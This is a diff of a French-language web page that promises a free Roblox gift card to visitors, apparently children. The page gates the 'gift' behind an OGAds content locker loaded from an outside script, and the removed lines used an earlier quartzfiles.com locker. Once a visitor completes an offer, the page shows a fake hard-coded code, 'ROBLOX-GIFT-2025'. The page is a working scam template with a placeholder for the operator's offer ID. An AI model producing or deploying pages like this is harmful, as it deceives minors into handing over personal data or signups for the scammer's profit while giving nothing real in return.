@@ -1,21 +1,66 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html>More actions
+<html lang="fr">
 <head>
-  <script>
-  if (!/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-    alert("📱 Veuillez ouvrir cette page sur un téléphone pour voir les offres disponibles.");
-  }
-</script>
+  <meta charset="UTF-8" />
+  <title>Carte cadeau Roblox gratuite</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
+      background: #f1f3f6;
+    }
+
+    h1 {
+      color: #cc0000;
+      font-size: 32px;
+    }
+
+    p {
+      font-size: 18px;
+      margin-bottom: 40px;
+    }
+
+    #lockerButton {
+      padding: 18px 40px;
+      font-size: 20px;
+      background-color: #ff4c4c;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    #lockerButton:hover {
+      background-color: #cc0000;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 30px;
+    }
+  </style>
 </head>
 <body>
+<img src="Roblox-card.png" alt="Carte cadeau Roblox" style="width: 400px; max-width: 90%; display: block; margin: 0 auto 30px;" />
+<img src="Roblox-card.png" alt="Carte cadeau Roblox" width="300" height="auto" />
+  <h1>Obtiens ta carte cadeau Roblox gratuite !</h1>
+  <p>Complète une courte offre pour débloquer ton code cadeau Roblox.</p>
+
+  <button id="lockerButton">Débloquer mon code Roblox</button>
 
   <!-- Script OGAds content locker -->
-<script type="text/javascript" src="https://quartzfiles.com/script_include.php?id=1819617"></script>
-<script>
-  document.getElementById("lockerButton").addEventListener("click", function() {
-    // Ce script ouvrira automatiquement le locker quand l'utilisateur clique
-    // quartzfiles va injecter son propre locker automatiquement
-  });
-</script>
-</body>
+  <script src="https://cdn.ogads.com/locker.js"></script>
+  <script>
+    var locker = new Locker({
+      offerId: "TON_OFFER_ID_ICI", // ⬅️ Remplace ceci avec ton vrai locker ID OGAds
+      buttonId: "lockerButton",
+      onComplete: function() {
+        alert("Merci ! Voici ton code : ROBLOX-GIFT-2025");
+      }
+    });
+  </script>
+</body>More actions
 </html>
